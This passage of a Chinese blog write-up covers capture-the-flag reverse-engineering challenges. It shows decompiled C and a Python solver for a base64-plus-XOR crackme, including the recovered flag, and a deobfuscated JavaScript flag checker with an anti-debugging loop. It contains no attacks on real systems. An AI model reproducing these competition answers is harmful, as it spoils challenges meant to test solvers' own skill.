class="string">&quot;Oh,no!&quot;</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">free</span>(v9);</span><br><span class="line">      ++v4;</span><br><span class="line">      v5 += <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Good!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sorry!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BYTE *__fastcall <span class="title">encrypt</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+10h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+14h] [rbp-6Ch]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+18h] [rbp-68h]</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v5; <span class="comment">// [rsp+20h] [rbp-60h]</span></span><br><span class="line">  _BYTE *v6; <span class="comment">// [rsp+28h] [rbp-58h]</span></span><br><span class="line">  <span class="keyword">char</span> v7[<span class="number">72</span>]; <span class="comment">// [rsp+30h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>(v7, <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>);</span><br><span class="line">  v5 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  <span class="keyword">if</span> ( v5 % <span class="number">3</span> )</span><br><span class="line">    v4 = <span class="number">4</span> * (v5 / <span class="number">3</span> + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v4 = <span class="number">4</span> * (v5 / <span class="number">3</span>);</span><br><span class="line">  v6 = <span class="built_in">malloc</span>(v4 + <span class="number">1</span>);</span><br><span class="line">  v6[v4] = <span class="number">0</span>;</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v2 &lt; v4 - <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v6[v2] = v7[(<span class="keyword">unsigned</span> __int8)a1[v3] &gt;&gt; <span class="number">2</span>];</span><br><span class="line">    v6[v2 + <span class="number">1</span>] = v7[((<span class="keyword">unsigned</span> __int8)a1[v3 + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * a1[v3]) &amp; <span class="string">&#x27;0&#x27;</span>];</span><br><span class="line">    v6[v2 + <span class="number">2</span>] = v7[((<span class="keyword">unsigned</span> __int8)a1[v3 + <span class="number">2</span>] &gt;&gt; <span class="number">6</span>) | (<span class="number">4</span> * a1[v3 + <span class="number">1</span>]) &amp; <span class="number">0x3C</span>];</span><br><span class="line">    v6[v2 + <span class="number">3</span>] = v7[a1[v3 + <span class="number">2</span>] &amp; <span class="number">0x3F</span>];</span><br><span class="line">    v3 += <span class="number">3</span>;</span><br><span class="line">    v2 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v5 % <span class="number">3</span> == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v6[v2 - <span class="number">2</span>] = <span class="number">61</span>;</span><br><span class="line">    v6[v2 - <span class="number">1</span>] = <span class="number">61</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v5 % <span class="number">3</span> == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v6[v2 - <span class="number">1</span>] = <span class="number">61</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到这里觉得是base64，也有可能是换表base64，但是解不出来，接着看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> __fastcall <span class="title">get_trans</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="built_in">strlen</span>(a1);</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    a1[i] ^= <span class="number">0x68</span>u;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在类似base编码之后还加了异或</p><p>思路：</p><ul><li>异或还原</li><li>base64</li></ul><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">s = [<span class="number">0x32</span>, <span class="number">0x05</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x32</span>, <span class="number">0x5B</span>, <span class="number">0x1B</span>, <span class="number">0x10</span>, <span class="number">0x30</span>, <span class="number">0x5A</span>, <span class="number">0x1F</span>, <span class="number">0x1F</span>, <span class="number">0x0C</span>, <span class="number">0x05</span>, <span class="number">0x3E</span>, <span class="number">0x0E</span>, <span class="number">0x0B</span>, <span class="number">0x05</span>, <span class="number">0x3E</span>, <span class="number">0x5A</span>, <span class="number">0x32</span>, <span class="number">0x3C</span>, <span class="number">0x21</span>, <span class="number">0x59</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0x58</span>, <span class="number">0x55</span>]</span><br><span class="line">ss = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    ss += <span class="built_in">chr</span>(i^<span class="number">0x68</span>)</span><br><span class="line">    </span><br><span class="line">print(base64.b64decode(ss))</span><br></pre></td></tr></table></figure><p><code>flag&#123;1_l0ve_reve25e&#125;</code></p><h2 id="JSNEWNEW"><a href="#JSNEWNEW" class="headerlink" title="JSNEWNEW"></a>JSNEWNEW</h2><p>一个html内嵌经过混淆的js代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((<span class="function">()=&gt;</span>&#123;<span class="function"><span class="keyword">function</span> <span class="title">_0x139d2b</span>(<span class="params"></span>)</span>&#123;<span class="built_in">setInterval</span>(<span class="function">()=&gt;</span>&#123;(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span>![]&#125;[<span class="string">&#x27;constructor&#x27;</span>](<span class="string">&#x27;debugger&#x27;</span>)[<span class="string">&#x27;call&#x27;</span>]())&#125;,<span class="number">0x32</span>)&#125;<span class="keyword">try</span>&#123;_0x139d2b()&#125;<span class="function"><span class="title">catch</span>(<span class="params">_0x536807</span>)</span>&#123;&#125;&#125;)());<span class="function"><span class="keyword">function</span> <span class="title">_Y0u</span>(<span class="params">_0x5093c8,_0x291ad5</span>)</span>&#123;<span class="keyword">return</span> _0x5093c8+_0x291ad5&#125;<span class="function"><span class="keyword">function</span> <span class="title">_C4n</span>(<span class="params">_0x4277b8</span>)</span>&#123;<span class="keyword">return</span> _0x4277b8&amp;<span class="number">0xff</span>&#125;<span class="function"><span class="keyword">function</span> <span class="title">_N3v3r</span>(<span class="params">_0x414184,_0x29df09</span>)</span>&#123;<span class="keyword">return</span> _C4n(_0x414184^_0x29df09)&#125;<span class="function"><span class="keyword">function</span> <span class="title">_G37</span>(<span class="params">_0x500f65,_0x1ddb85</span>)</span>&#123;<span class="keyword">return</span> _C4n(_0x500f65|_0x1ddb85)&#125;<span class="function"><span class="keyword">function</span> <span class="title">_Th15</span>(<span class="params">_0x1621d6,_0x285fc7</span>)</span>&#123;<span class="keyword">return</span> _C4n(_0x1621d6&amp;_0x285fc7)&#125;<span class="function"><span class="keyword">function</span> <span class="title">_H4</span>(<span class="params">_0x2abb65</span>)</span>&#123;<span class="keyword">return</span> _C4n(~_0x2abb65)&#125;<span class="function"><span class="keyword">function</span> <span class="title">_H4H4</span>(<span class="params">_0x5b22bc</span>)</span>&#123;<span class="keyword">return</span> _C4n(_H4H4H4(_H4(_0x5b22bc),_H4H4H4([],<span class="number">0x1</span>)))&#125;<span class="function"><span class="keyword">function</span> <span class="title">_H4H4H4</span>(<span class="params">_0x431cb1,_0x516603</span>)</span>&#123;<span class="keyword">return</span> _C4n((_H4(_G37(_H4(_Y0u(_0x431cb1,_0x516603)),_H4(_Y0u(_0x431cb1,_0x516603)))),_H4(_G37(_H4(_Y0u(_0x431cb1,_0x516603)),_H4(_Y0u(_0x431cb1,_0x516603))))))&#125;<span class="function"><span class="keyword">function</span> <span class="title">_H4H4H4H4</span>(<span class="params">_0x1b81b8,_0x11e8ab,_0x2c730f</span>)</span>&#123;<span class="keyword">return</span> a=_H4H4H4(_0x1b81b8,_0x2c730f),a=_H4H4H4(a,_H4H4(_0x11e8ab)),a=_H4H4H4(a,_H4H4(_0x2c730f)),_C4n(a)&#125;<span class="function"><span class="keyword">function</span> <span class="title">_G00D</span>(<span class="params">_0x51eb06</span>)</span>&#123;((<span class="function">()=&gt;</span>&#123;<span class="function"><span class="keyword">function</span> <span class="title">_0x139d2b</span>(<span class="params"></span>)</span>&#123;<span class="built_in">setInterval</span>(<span class="function">()=&gt;</span>&#123;(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span>![]&#125;[<span class="string">&#x27;constructor&#x27;</span>](<span class="string">&#x27;debugger&#x27;</span>)[<span class="string">&#x27;call&#x27;</span>]())&#125;,<span class="number">0x32</span>)&#125;<span class="keyword">try</span>&#123;_0x139d2b()&#125;<span class="function"><span class="title">catch</span>(<span class="params">_0x536807</span>)</span>&#123;&#125;&#125;)());<span class="keyword">var</span> _0x8b9e29=<span class="built_in">document</span>[<span class="string">&#x27;getElementById&#x27;</span>](<span class="string">&#x27;passwordError&#x27;</span>);_0xcaf3caf3=[],_0xc4f3c4f3=[<span class="number">0x55</span>,<span class="number">0xbf</span>,<span class="number">0x63</span>,<span class="number">0xbc</span>,<span class="number">0x33</span>,<span class="number">0x95</span>,<span class="number">0x31</span>,<span class="number">0x4c</span>,<span class="number">0x89</span>,<span class="number">0x6b</span>,<span class="number">0x49</span>,<span class="number">0x31</span>,<span class="number">0x30</span>,<span class="number">0xdf</span>,<span class="number">0x63</span>,<span class="number">0xe5</span>,<span class="number">0x57</span>,<span class="number">0xd7</span>,<span class="number">0x73</span>,<span class="number">0xa6</span>,<span class="number">0x6e</span>,<span class="number">0xd3</span>,<span class="number">0x63</span>,<span class="number">0xa1</span>,<span class="number">0x92</span>,<span class="number">0x5b</span>,<span class="number">0x72</span>,<span class="number">0xe6</span>,<span class="number">0x8f</span>,<span class="number">0x76</span>,<span class="number">0x4f</span>,<span class="number">0xd0</span>],Hur1k=<span class="string">&#x27;Hur1k&#x27;</span>;<span class="keyword">if</span>(_0x51eb06[<span class="string">&#x27;length&#x27;</span>]!=<span class="number">0x27</span>)<span class="keyword">return</span> _0x8b9e29[<span class="string">&#x27;textContent&#x27;</span>]=<span class="string">&#x27;错误的&#x27;</span>,![];<span class="keyword">if</span>(_0x51eb06[<span class="string">&#x27;substr&#x27;</span>](<span class="number">0x0</span>,<span class="number">0x6</span>)!=<span class="string">&#x27;XSCTF&#123;&#x27;</span>)<span class="keyword">return</span> _0x8b9e29[<span class="string">&#x27;textContent&#x27;</span>]=<span class="string">&#x27;错误的&#x27;</span>,![];<span class="keyword">if</span>(_0x51eb06[<span class="number">0x26</span>]!=<span class="string">&#x27;&#125;&#x27;</span>)<span class="keyword">return</span> _0x8b9e29[<span class="string">&#x27;textContent&#x27;</span>]=<span class="string">&#x27;错误的&#x27;</span>,![];_0x114514=_0x51eb06[<span class="string">&#x27;substr&#x27;</span>](<span class="number">0x6</span>,<span class="number">0x20</span>),_0x51eb06=[];<span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">var</span> _0x28db6c=<span class="number">0x0</span>;_0x28db6c&lt;_0x114514[<span class="string">&#x27;length&#x27;</span>];_0x28db6c++</span>)</span>&#123;_0x51eb06[<span class="string">&#x27;push&#x27;</span>](_0x114514[<span class="string">&#x27;charCodeAt&#x27;</span>](_0x28db6c))&#125;<span class="built_in">Math</span>[<span class="string">&#x27;seed&#x27;</span>]=<span class="keyword">new</span> <span class="built_in">Date</span>()[<span class="string">&#x27;getTime&#x27;</span>](),<span class="built_in">Math</span>[<span class="string">&#x27;seededRandom&#x27;</span>]=<span class="function"><span class="keyword">function</span>(<span class="params">_0x14b0c9,_0x56fb11</span>)</span>&#123;_0x56fb11=_0x56fb11||<span class="number">0x1</span>,_0x14b0c9=_0x14b0c9||<span class="number">0x0</span>,<span class="built_in">Math</span>[<span class="string">&#x27;seed&#x27;</span>]=(<span class="built_in">Math</span>[<span class="string">&#x27;seed&#x27;</span>]*<span class="number">0x2455</span>+<span class="number">0xc091</span>)%<span class="number">0x38f40</span>;<span class="keyword">var</span> _0xee8b23=<span class="built_in">Math</span>[<span class="string">&#x27;seed&#x27;</span>]/<span class="number">0x38f40</span>;<span class="keyword">return</span> <span class="built_in">parseInt</span>(_0x14b0c9+_0xee8b23*(_0x56fb11-_0x14b0c9))&#125;;<span class="keyword">var</span> _0xe5731c=<span class="built_in">Math</span>[<span class="string">&#x27;seededRandom&#x27;</span>](<span class="number">0x0</span>,<span class="number">0x100</span>);<span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">var</span> _0x28db6c=<span class="number">0x0</span>;_0x28db6c&lt;_0x51eb06[<span class="string">&#x27;length&#x27;</span>];_0x28db6c+=<span class="number">0x2</span></span>)</span>&#123;tmp=_H4H4H4(_0x51eb06[_0x28db6c],_0x28db6c)^_0x28db6c,_0xcaf3caf3[<span class="string">&#x27;push&#x27;</span>](tmp),randNum=<span class="built_in">Math</span>[<span class="string">&#x27;seededRandom&#x27;</span>](<span class="number">0x0</span>,<span class="number">0x100</span>),<span class="built_in">Math</span>[<span class="string">&#x27;seed&#x27;</span>]=randNum,tmp=_H4H4H4H4(tmp^_0x51eb06[_0x28db6c+<span class="number">0x1</span>],Hur1k[<span class="string">&#x27;charCodeAt&#x27;</span>]([_0x28db6c/<span class="number">0x2</span>%Hur1k[<span class="string">&#x27;length&#x27;</span>]]),randNum),_0xcaf3caf3[<span class="string">&#x27;push&#x27;</span>](tmp)&#125;((<span class="function">()=&gt;</span>&#123;<span class="function"><span class="keyword">function</span> <span class="title">_0x139d2b</span>(<span class="params"></span>)</span>&#123;<span class="built_in">setInterval</span>(<span class="function">()=&gt;</span>&#123;(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span>![]&#125;[<span class="string">&#x27;constructor&#x27;</span>](<span class="string">&#x27;debugger&#x27;</span>)[<span class="string">&#x27;call&#x27;</span>]())&#125;,<span class="number">0x32</span>)&#125;<span class="keyword">try</span>&#123;_0x139d2b()&#125;<span class="function"><span class="title">catch</span>(<span class="params">_0x536807</span>)</span>&#123;&#125;&#125;)());<span class="keyword">if</span>(_0xcaf3caf3[<span class="string">&#x27;length&#x27;</span>]!=<span class="number">0x20</span>)<span class="keyword">return</span> _0x8b9e29[<span class="string">&#x27;textContent&#x27;</span>]=<span class="string">&#x27;究极错误的&#x27;</span>,![];<span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">var</span> _0x28db6c=<span class="number">0x0</span>;_0x28db6c&lt;_0xcaf3caf3[<span class="string">&#x27;length&#x27;</span>];_0x28db6c++</span>)</span>&#123;<span class="keyword">if</span>(_0xcaf3caf3[_0x28db6c]!=_0xc4f3c4f3[_0x28db6c])<span class="keyword">return</span> _0x8b9e29[<span class="string">&#x27;textContent&#x27;</span>]=<span class="string">&#x27;错误的&#x27;</span>,![]&#125;<span class="keyword">return</span>!![]&#125;</span><br></pre></td></tr></table></figure><p>首先经过<a href="https://obf-io.deobfuscate.io/">Obfuscator.io Deobfuscator (deobfuscate.io)</a>，初步解混淆<br>再通过<a href="https://deobfuscate.io/">JavaScript Deobfuscator (deobfuscate.io)</a>，再解一次<br>然后就解不动了（不排除有其他工具）</p><p>解混淆的结果</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">_0x139d2b</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;.constructor(<span class="string">&quot;debugger&quot;</span>).call());</span><br><span class="line">    &#125;, <span class="number">50</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    _0x139d2b();</span><br><span class="line">  &#125; <span class="keyword">catch</span> (_0x536807) &#123;&#125;</span><br><span class="line">&#125;)();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_H4H4H4</span>(<span class="params">_0x431cb1, _0x516603</span>) </span>&#123;</span><br><span class="line">  ~((~(_0x431cb1 + _0x516603) &amp; <span class="number">255</span> | ~(_0x431cb1 + _0x516603) &amp; <span class="number">255</span>) &amp; <span class="number">255</span>) &amp; <span class="number">255</span>;</span><br><span class="line">  <span class="keyword">return</span> ~((~(_0x431cb1 + _0x516603) &amp; <span class="number">255</span> | ~(_0x431cb1 + _0x516603) &amp; <span class="number">255</span>) &amp; <span class="number">255</span>) &amp; <span class="number">255</span> &amp; <span class="number">255</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_H4H4H4H4</span>(<span class="params">_0x1b81b8, _0x11e8ab, _0x2c730f</span>) </span>&#123;</span><br><span class="line">  a = _H4H4H4(_0x1b81b8, _0x2c730f);</span><br><span class="line">  a = _H4H4H4(a, _H4H4H4(~_0x11e8ab &amp; <span class="number">255</span>, _H4H4H4([], <span class="number">1</span>)) &amp; <span class="number">255</span>);</span><br><span class="line">  a = _H4H4H4(a, _H4H4H4(~_0x2c730f &amp; <span class="number">255</span>, _H4H4H4([], <span class="number">1</span>)) &amp; <span class="number">255</span>);</span><br><span class="line">  <span class="keyword">return</span> a &amp; <span class="number">255</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_G00D</span>(<span class="params">_0x51eb06</span>) </span>&#123;</span><br><span class="line">  (<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">_0x139d2b</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;.constructor(<span class="string">&quot;debugger&quot;</span>).call());</span><br><span class="line">      &#125;, <span class="number">50</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      _0x139d2b();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (_0x536807) &#123;&#125;</span><br><span class="line">  &#125;)();</span><br><span class="line">  <span class="keyword">var</span> _0x8b9e29 = <span class="built_in">document</span>.getElementById(<span class="string">&quot;passwordError&quot;</span>);</span><br><span class="line">  _0xcaf3caf3 = [];</span><br><span class="line">  _0xc4f3c4f3 = [<span class="number">85</span>, <span class="number">191</span>, <span class="number">99</span>, <span class="number">188</span>, <span class="number">51</span>, <span class="number">149</span>, <span class="number">49</span>, <span class="number">76</span>, <span class="number">137</span>, <span class="number">107</span>, <span class="number">73</span>, <span class="number">49</span>, <span class="number">48</span>, <span class="number">223</span>, <span class="number">99</span>, <span class="number">229</span>, <span class="number">87</span>, <span class="number">215</span>, <span class="number">115</span>, <span class="number">166</span>, <span class="number">110</span>, <span class="number">211</span>, <span class="number">99</span>, <span class="number">161</span>, <span class="number">146</span>, <span class="number">91</span>, <span class="number">114</span>, <span class="number">230</span>, <span class="number">143</span>, <span class="number">118</span>, <span class="number">79</span>, <span class="number">208</span>];</span><br><span class="line">  Hur1k = <span class="string">&quot;Hur1k&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> (_0x51eb06.length != <span class="number">39</span>) &#123;</span><br><span class="line">    _0x8b9e29.textContent = <span class="string">&quot;错误的&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (_0x51eb06.substr(<span class="number">0</span>, <span class="number">6</span>) != <span class="string">&quot;XSCTF&#123;&quot;</span>) &#123;</span><br><span class="line">    _0x8b9e29.textContent = <span class="string">&quot;错误的&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (_0x51eb06[<span class="number">38</span>] != <span class="string">&quot;&#125;&quot;</span>) &#123;</span><br><span class="line">    _0x8b9e29.textContent = <span class="string">&quot;错误的&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  _0x114514 = _0x51eb06.substr(<span class="number">6</span>, <span class="number">32</span>);</span><br><span class="line">  _0x51eb06 = [];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> _0x28db6c = <span class="number">0</span>; _0x28db6c &lt; _0x114514.length; _0x28db6c++) &#123;</span><br><span class="line">    _0x51eb06.push(_0x114514.charCodeAt(_0x28db6c));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">Math</span>.seed = (<span class="keyword">new</span> <span class="built_in">Date</span>).getTime();</span><br><span class="line">  <span class="built_in">Math</span>.seededRandom = <span class="function"><span class="keyword">function</span> (<span class="params">_0x14b0c9, _0x56fb11</span>) </span>&#123;</span><br><span class="line">    _0x56fb11 = _0x56fb11 || <span class="number">1</span>;</span><br><span class="line">    _0x14b0c9 = _0x14b0c9 || <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">Math</span>.seed = (<span class="built_in">Math</span>.seed * <span class="number">9301</span> + <span class="number">49297</span>) % <span class="number">233280</span>;</span><br><span class="line">    <span class="keyword">var</span> _0xee8b23 = <span class="built_in">Math</span>.seed / <span class="number">233280</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parseInt</span>(_0x14b0c9 + _0xee8b23 * (_0x56fb11 - _0x14b0c9));</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> _0x28db6c = <span class="number">0</span>; _0x28db6c &lt; _0x51eb06.length; _0x28db6c += <span class="number">2</span>) &#123;</span><br><span class="line">    tmp = _H4H4H4(_0x51eb06[_0x28db6c], _0x28db6c) ^ _0x28db6c;</span><br><span class="line">    _0xcaf3caf3.push(tmp);</span><br><span class="line">    randNum = <span class="built_in">Math</span>.seededRandom(<span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line">    <span class="built_in">Math</span>.seed = randNum;</span><br><span class="line">    tmp = _H4H4H4H4(tmp ^ _0x51eb06[_0x28db6c + <span class="number">1</span>], Hur1k.charCodeAt([_0x28db6c / <span class="number">2</span> % Hur1k.length]), randNum);</span><br><span class="line">    _0xcaf3caf3.push(tmp);</span><br><span class="line">  &#125;</span><br><span class="line">  (<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">_0x139d2b</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;.constructor(<span class="string">&quot;debugger&quot;</span>).call());</span><br><span class="line">      &#125;, <span class="number">50</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      _0x139d2b();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (_0x536807) &#123;&#125;</span><br><span class="line">  &#125;)();</span><br><span class="line">  <span class="keyword">if</span> (_0xcaf3caf3.length != <span class="number">32</span>) &#123;</span><br><span class="line">    _0x8b9e29.textContent = <span class="string">&quot;究极错误的&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> _0x28db6c = <span class="number">0</span>; _0x28db6c &lt; _0xcaf3caf3.length; _0x28db6c++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (_0xcaf3caf3[_0x28db6c] != _0xc4f3c4f3[_0x28db6c]) &#123;</span><br><span class="line">      _0x8b9e29.textContent = <span class="string">&quot;错误的&quot;</span>;</span><br><span class="line">      <span 